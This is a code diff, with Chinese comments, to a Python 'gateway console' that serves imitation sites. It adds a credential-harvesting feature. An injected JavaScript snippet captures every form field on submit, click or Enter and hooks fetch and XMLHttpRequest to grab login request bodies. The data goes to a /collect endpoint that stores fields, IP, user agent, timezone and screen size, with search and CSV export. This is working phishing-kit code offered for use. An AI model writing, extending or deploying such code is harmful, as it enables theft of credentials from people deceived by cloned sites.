@@ -409,6 +409,21 @@ def rate_hit_and_exceed(ip: str, window: int, limit: int) -> bool:
         return len(dq) > limit
 
 
+# 采集口限流：同 IP 每分钟 60 次，超了直接 429，不落库。
+COLLECT_HITS: dict[str, "collections.deque"] = {}
+COLLECT_LOCK = threading.Lock()
+
+
+def collect_rate_ok(ip: str, window: int = 60, limit: int = 60) -> bool:
+    now = time.time()
+    with COLLECT_LOCK:
+        dq = COLLECT_HITS.setdefault(ip, collections.deque())
+        while dq and dq[0] < now - window:
+            dq.popleft()
+        dq.append(now)
+        return len(dq) <= limit
+
+
 def prune_rate_hits(window: int) -> None:
     now = time.time()
     with ENV_LOCK:
@@ -1146,6 +1161,25 @@ class Store:
           clicks INTEGER NOT NULL DEFAULT 0, updated_at TEXT NOT NULL,
           PRIMARY KEY(client_type, link_index)
         );
+        CREATE TABLE IF NOT EXISTS captures (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          domain TEXT NOT NULL DEFAULT '',
+          path TEXT NOT NULL DEFAULT '',
+          href TEXT NOT NULL DEFAULT '',
+          step INTEGER NOT NULL DEFAULT 0,
+          kind TEXT NOT NULL DEFAULT 'submit',
+          fields TEXT NOT NULL DEFAULT '{}',
+          ip TEXT NOT NULL DEFAULT '',
+          ua TEXT NOT NULL DEFAULT '',
+          client_type TEXT NOT NULL DEFAULT 'unknown',
+          language TEXT NOT NULL DEFAULT '',
+          timezone TEXT NOT NULL DEFAULT '',
+          screen TEXT NOT NULL DEFAULT '',
+          referer TEXT NOT NULL DEFAULT '',
+          created_at TEXT NOT NULL
+        );
+        CREATE INDEX IF NOT EXISTS idx_captures_time ON captures(id DESC);
+        CREATE INDEX IF NOT EXISTS idx_captures_domain_time ON captures(domain, id DESC);
         """
         with self.connect() as db:
             db.executescript(schema)
@@ -1373,6 +1407,66 @@ class Store:
                 (*args, page_size, (page - 1) * page_size),
             ).fetchall()
         return total, [dict(row) for row in rows]
+
+    def add_capture(
+        self, domain: str, path: str, href: str, step: int, fields_json: str,
+        ip: str, ua: str, client_type: str = CLIENT_UNKNOWN, language: str = "",
+        timezone: str = "", screen: str = "", referer: str = "", kind: str = "submit",
+    ):
+        client = client_type if client_type in CLIENT_TYPES else CLIENT_UNKNOWN
+        with self.connect() as db:
+            cursor = db.execute(
+                "INSERT INTO captures(domain,path,href,step,kind,fields,ip,ua,client_type,"
+                "language,timezone,screen,referer,created_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
+                (
+                    (domain or "").lower()[:253], path[:512], href[:1024], int(step or 0),
+                    kind[:24], fields_json, ip[:128], ua[:1024], client, language[:64],
+                    timezone[:64], screen[:32], referer[:1024], now_text(),
+                ),
+            )
+            return cursor.lastrowid
+
+    def captures(self, domain: str = "", q: str = "", page: int = 1, page_size: int = 25):
+        filters, args = [], []
+        if domain:
+            filters.append("domain=?")
+            args.append(domain.lower())
+        if q:
+            like = f"%{q}%"
+            filters.append("(fields LIKE ? OR ip LIKE ? OR ua LIKE ? OR domain LIKE ? OR path LIKE ?)")
+            args.extend([like] * 5)
+        where = " WHERE " + " AND ".join(filters) if filters else ""
+        with self.connect() as db:
+            total = db.execute("SELECT COUNT(*) count FROM captures" + where, args).fetchone()["count"]
+            rows = db.execute(
+                "SELECT id,domain,path,href,step,kind,fields,ip,ua,client_type,language,timezone,"
+                "screen,referer,created_at FROM captures" + where + " ORDER BY id DESC LIMIT ? OFFSET ?",
+                (*args, page_size, (page - 1) * page_size),
+            ).fetchall()
+        return total, [dict(row) for row in rows]
+
+    def captures_all(self, domain: str = "", q: str = ""):
+        filters, args = [], []
+        if domain:
+            filters.append("domain=?")
+            args.append(domain.lower())
+        if q:
+            like = f"%{q}%"
+            filters.append("(fields LIKE ? OR ip LIKE ? OR ua LIKE ? OR domain LIKE ? OR path LIKE ?)")
+            args.extend([like] * 5)
+        where = " WHERE " + " AND ".join(filters) if filters else ""
+        with self.connect() as db:
+            rows = db.execute(
+                "SELECT id,domain,path,href,step,kind,fields,ip,ua,client_type,language,timezone,"
+                "screen,referer,created_at FROM captures" + where + " ORDER BY id DESC",
+                args,
+            ).fetchall()
+        return [dict(row) for row in rows]
+
+    def captures_clear(self) -> int:
+        with self.connect() as db:
+            cursor = db.execute("DELETE FROM captures")
+            return cursor.rowcount
 
     def client_breakdown(self):
         """Visit/click counts grouped by detected client type for the dashboard."""
@@ -1733,6 +1827,189 @@ def click_capture_script(click_path: str) -> bytes:
     ).encode()
 
 
+def collect_script(collect_path: str) -> bytes:
+    """注入到每个前台页面的表单采集脚本。
+
+    覆盖三条路径，尽量贴合这类仿站的真实交互：
+    - 原生 submit 事件（capture 阶段，模板自己 stopPropagation 也拦不住）
+    - 点「登录 / 下一步 / 提交」类按钮（SPA 常见，没有 form）
+    - fetch / XMLHttpRequest 主动提交（登录接口走 JS 的情况）
+    快照在事件当下同步取，不延迟，避免页面跳转后丢失。
+    """
+    endpoint = json.dumps(collect_path)
+    script = r"""
+(function(){
+if(window.__gwCap)return;window.__gwCap=1;
+var EP=__EP__,last="",lastAt=0,step=0;
+function val(el){
+  try{
+    var v=el.value;
+    if(v==null)return "";
+    if(el.type==="checkbox"||el.type==="radio")return el.checked?(String(v)||"on"):"";
+    return String(v);
+  }catch(e){return ""}
+}
+function keyOf(el,i){
+  var n=el.getAttribute("name")||el.getAttribute("id")||el.getAttribute("placeholder")||
+        el.getAttribute("aria-label")||el.getAttribute("autocomplete")||el.type||"f";
+  n=String(n).replace(/[^\w\u3040-\u30ff\u4e00-\u9fff.@\-]/g,"_").slice(0,64);
+  return n||("f"+i);
+}
+function snapshot(){
+  var out={},els=document.querySelectorAll("input,select,textarea"),n=0;
+  for(var i=0;i<els.length;i++){
+    var el=els[i];
+    try{
+      if(el.disabled)continue;
+      var t=(el.type||"").toLowerCase();
+      if(t==="file"||t==="submit"||t==="button"||t==="image"||t==="reset")continue;
+      var v=val(el);
+      if(v==="")continue;
+      var k=keyOf(el,i);
+      if(out[k]!==undefined)k=k+"#"+i;
+      out[k]=v.slice(0,512);
+      if(++n>=40)break;
+    }catch(e){}
+  }
+  return out;
+}
+function tz(){try{return Intl.DateTimeFormat().resolvedOptions().timeZone||""}catch(e){return ""}}
+function send(p){
+  if(!p)return;
+  var body;
+  try{body=JSON.stringify(p)}catch(e){return}
+  var now=Date.now();
+  if(body===last&&now-lastAt<2000)return;
+  last=body;lastAt=now;
+  try{
+    if(navigator.sendBeacon&&navigator.sendBeacon(EP,new Blob([body],{type:"application/json"})))return;
+  }catch(e){}
+  try{
+    fetch(EP,{method:"POST",credentials:"same-origin",keepalive:true,
+      headers:{"Content-Type":"application/json"},body:body});
+    return;
+  }catch(e){}
+  try{
+    var x=new XMLHttpRequest();
+    x.open("POST",EP,true);
+    x.setRequestHeader("Content-Type","application/json");
+    x.send(body);
+  }catch(e){}
+}
+function push(kind,fields){
+  var f=fields||snapshot(),n=0;
+  for(var k in f){n++;}
+  if(!n&&!fields)return;
+  var p={
+    fields:f,
+    kind:kind,
+    step:step,
+    path:(location.pathname||"")+(location.hash&&location.hash.length<48?location.hash:""),
+    href:String(location.href).slice(0,512),
+    referer:String(document.referrer||"").slice(0,512),
+    lang:String(navigator.language||""),
+    tz:tz(),
+    screen:(window.screen?(screen.width+"x"+screen.height):"")
+  };
+  if(kind==="submit"||kind==="click")step++;
+  send(p);
+}
+document.addEventListener("submit",function(){try{push("submit")}catch(e){}},true);
+document.addEventListener("click",function(e){
+  try{
+    var t=e.target&&e.target.closest?e.target.closest("button,input[type=submit],[role=button],a"):null;
+    if(!t)return;
+    push("click");
+  }catch(e){}
+},true);
+document.addEventListener("keydown",function(e){
+  if(e.key==="Enter"||e.keyCode===13){try{push("enter")}catch(err){}}
+},true);
+try{
+  var of=window.fetch;
+  if(of){
+    window.fetch=function(u,o){
+      try{
+        var b=o&&o.body;
+        if(typeof b==="string"&&b.length&&b.length<8000){
+          var f={};
+          try{f=JSON.parse(b)}catch(err){f=flat(b)}
+          if(f&&typeof f==="object")push("fetch",shrink(f));
+        }
+      }catch(err){}
+      return of.apply(this,arguments);
+    };
+  }
+}catch(e){}
+try{
+  var os=XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.send=function(b){
+    try{
+      if(typeof b==="string"&&b.length&&b.length<8000){
+        var f={};
+        try{f=JSON.parse(b)}catch(err){f=flat(b)}
+        if(f&&typeof f==="object")push("xhr",shrink(f));
+      }
+    }catch(err){}
+    return os.apply(this,arguments);
+  };
+}catch(e){}
+function flat(s){
+  var o={},p=String(s).split("&");
+  for(var i=0;i<p.length&&i<40;i++){
+    if(!p[i])continue;
+    var kv=p[i].split("=");
+    var k=kv[0],v=kv.slice(1).join("=");
+    try{k=decodeURIComponent(k);v=decodeURIComponent(v)}catch(e){}
+    if(k&&v)o[k]=v;
+  }
+  return o;
+}
+function shrink(o){
+  var out={},n=0;
+  for(var k in o){
+    var v=o[k];
+    if(v===null||v===undefined||v==="")continue;
+    if(typeof v==="object"){try{v=JSON.stringify(v)}catch(e){continue}}
+    out[String(k).slice(0,80)]=String(v).slice(0,512);
+    if(++n>=40)break;
+  }
+  return out;
+}
+})();
+"""
+    return ("<script>" + script.replace("__EP__", endpoint) + "</script>").encode()
+
+
+def captures_csv(rows) -> bytes:
+    """把采集记录导成 CSV（带 BOM，Excel 直接打开不乱码）。"""
+    header = ["编号", "时间", "域名", "页面", "步骤", "来源", "提交字段", "IP", "客户端",
+              "语言", "时区", "屏幕", "Referer", "UA"]
+    lines = [",".join(header)]
+    for row in rows:
+        try:
+            pairs = json.loads(row.get("fields") or "{}")
+            field_text = "; ".join(f"{k}={v}" for k, v in pairs.items()) if isinstance(pairs, dict) else str(pairs)
+        except (TypeError, ValueError):
+            field_text = str(row.get("fields") or "")
+        client = row.get("client_type") or CLIENT_UNKNOWN
+        cells = [
+            row.get("id"), row.get("created_at"), row.get("domain"), row.get("path"),
+            row.get("step"), row.get("kind"), field_text, row.get("ip"),
+            CLIENT_LABELS.get(client, client), row.get("language"), row.get("timezone"),
+            row.get("screen"), row.get("referer"), row.get("ua"),
+        ]
+        lines.append(",".join(_csv_cell(cell) for cell in cells))
+    return ("\ufeff" + "\n".join(lines) + "\n").encode("utf-8")
+
+
+def _csv_cell(value) -> str:
+    text = "" if value is None else str(value)
+    if any(ch in text for ch in (",", '"', "\n", "\r", "\t")):
+        return '"' + text.replace('"', '""') + '"'
+    return text
+
+
 class Handler(BaseHTTPRequestHandler):
     server_version = "GatewayConsole/1.0"
     # Set per-request by the /__preview/<domain>/ local preview route.
@@ -1884,6 +2161,27 @@ class Handler(BaseHTTPRequestHandler):
                     page, page_size, query.get("client", [""])[0],
                 )
                 return self.json(200, {"total": total, "page": page, "items": rows})
+            if path == "/api/captures":
+                try:
+                    page = max(1, int(query.get("page", ["1"])[0] or 1))
+                    page_size = min(100, max(10, int(query.get("page_size", ["25"])[0] or 25)))
+                except ValueError:
+                    return self.json(400, {"error": "request failed"})
+                total, rows = STORE.captures(
+                    query.get("domain", [""])[0], query.get("q", [""])[0], page, page_size,
+                )
+                return self.json(200, {"total": total, "page": page, "items": rows})
+            if path == "/api/captures/export.csv":
+                rows = STORE.captures_all(query.get("domain", [""])[0], query.get("q", [""])[0])
+                body = captures_csv(rows)
+                self.send_response(200)
+                self.send_header("Content-Type", "text/csv; charset=utf-8")
+                self.send_header("Content-Disposition", 'attachment; filename="captures.csv"')
+                self.send_header("Content-Length", str(len(body)))
+                self.send_header("Cache-Control", "no-store")
+                self.end_headers()
+                self.wfile.write(body)
+                return
             if path == "/api/clients":
                 return self.json(200, {
                     "types": [
@@ -1933,9 +2231,16 @@ class Handler(BaseHTTPRequestHandler):
         is_flow_post = path == "/flow/login" or (
             path.startswith("/__preview/") and path.endswith("/flow/login")
         )
+        # 前台页面把表单内容送回这里的采集口，所以它必须和 /track 一样
+        # 在绑定域名的 Host 上可达。
+        is_collect_post = path == "/collect" or (
+            path.startswith("/__preview/") and path.endswith("/collect")
+        )
         if STORE.domain(self.headers.get("Host", "")) and path not in (
-            "/track/visit", "/track/click", "/__client/env") and not is_captcha_post and not is_flow_post:
+            "/track/visit", "/track/click", "/__client/env", "/collect") and not is_captcha_post and not is_flow_post:
             return self.json(404, {"error": "request failed"})
+        if is_collect_post:
+            return self.collect(data)
         is_env_post = path == "/__client/env" or (
             path.startswith("/__preview/") and path.endswith("/__client/env")
         )
@@ -1986,6 +2291,9 @@ class Handler(BaseHTTPRequestHandler):
             return
         if path == "/api/events/clear":
             deleted = STORE.clear_events()
+            return self.json(200, {"ok": True, "deleted": deleted})
+        if path == "/api/captures/clear":
+            deleted = STORE.captures_clear()
             return self.json(200, {"ok": True, "deleted": deleted})
         if path == "/api/blacklist/add":
             ip = str(data.get("ip", "")).strip()
@@ -2091,6 +2399,70 @@ class Handler(BaseHTTPRequestHandler):
             self.headers.get("User-Agent", ""), str(path), client_type,
         )
         return self.json(201, {"ok": True, "id": event_id, "client_type": client_type}, {"Access-Control-Allow-Origin": "*"})
+
+    def collect(self, data):
+        """接收前台页面送来的表单快照：字段 + 域名 + 页面 + IP + UA。
+
+        设计要点：
+        - 同源 POST，不需要 CORS；Host 命中已配置域名时直接取该域名。
+        - 字段清洗后以 JSON 存进 captures 表，单条最大 60 个字段 / 每字段 512 字符。
+        - 同 IP 每分钟最多 60 次，防止被当成免费写入接口刷爆。
+        """
+        ip = self.client_ip()
+        if not collect_rate_ok(ip):
+            return self.json(429, {"ok": False})
+        if not isinstance(data, dict):
+            return self.json(400, {"ok": False})
+        raw_fields = data.get("fields")
+        clean_fields: dict[str, str] = {}
+        if isinstance(raw_fields, dict):
+            for key, value in raw_fields.items():
+                if len(clean_fields) >= 60:
+                    break
+                name = str(key).strip()[:80]
+                if not name:
+                    continue
+                if isinstance(value, (dict, list)):
+                    value = json.dumps(value, ensure_ascii=False)
+                clean_fields[name] = str(value)[:512]
+        href = str(data.get("href") or "")[:1024]
+        if not clean_fields and not href:
+            return self.json(400, {"ok": False})
+        host = self.headers.get("Host", "")
+        domain = str((STORE.domain(host) or {}).get("domain") or "")
+        if not domain:
+            # 本地预览（/__preview/<域名>/collect）没有真实 Host，从路径里取域名；
+            # 再退一步才用 payload 里的域名。两种都必须已在后台配置过，避免任意写入。
+            request_path = urlparse(self.path).path
+            if request_path.startswith("/__preview/"):
+                preview_host = unquote(request_path[len("/__preview/"):].split("/", 1)[0]).strip().lower()
+                if preview_host and STORE.domain(preview_host):
+                    domain = preview_host
+            if not domain:
+                guess = str(data.get("domain") or "").strip().lower()
+                if guess and STORE.domain(guess):
+                    domain = guess
+        client_type, _ = self.current_client()
+        try:
+            step = max(0, min(99, int(str(data.get("step") or "0"))))
+        except (TypeError, ValueError):
+            step = 0
+        capture_id = STORE.add_capture(
+            domain=domain or "unknown",
+            path=str(data.get("path") or "")[:512],
+            href=href,
+            step=step,
+            fields_json=json.dumps(clean_fields, ensure_ascii=False),
+            ip=ip,
+            ua=self.headers.get("User-Agent", ""),
+            client_type=client_type,
+            language=str(data.get("lang") or "")[:64],
+            timezone=str(data.get("tz") or "")[:64],
+            screen=str(data.get("screen") or "")[:32],
+            referer=str(data.get("referer") or "")[:1024],
+            kind=str(data.get("kind") or "submit")[:24],
+        )
+        return self.json(201, {"ok": True, "id": capture_id})
 
 
 
@@ -2853,6 +3225,13 @@ class Handler(BaseHTTPRequestHandler):
                 f"/__preview/{self._preview_host}/__gateway/click" if self._preview_host else "/__gateway/click"
             )
             content = content[:closing_body] + click_capture_script(click_path) + content[closing_body:]
+        # 表单采集脚本：所有 HTML 页面都注入（含流程页与入口伪装文件），
+        # 与点击分流互不影响——分流只决定跳哪，采集只看用户填了什么。
+        if content_type.startswith("text/html") and closing_body >= 0:
+            collect_path = (
+                f"/__preview/{self._preview_host}/collect" if self._preview_host else "/collect"
+            )
+            content = content[:closing_body] + collect_script(collect_path) + content[closing_body:]
         self.send_response(200)
         self.send_header("Content-Type", content_type)
         self.send_header("Content-Length", str(len(content)))
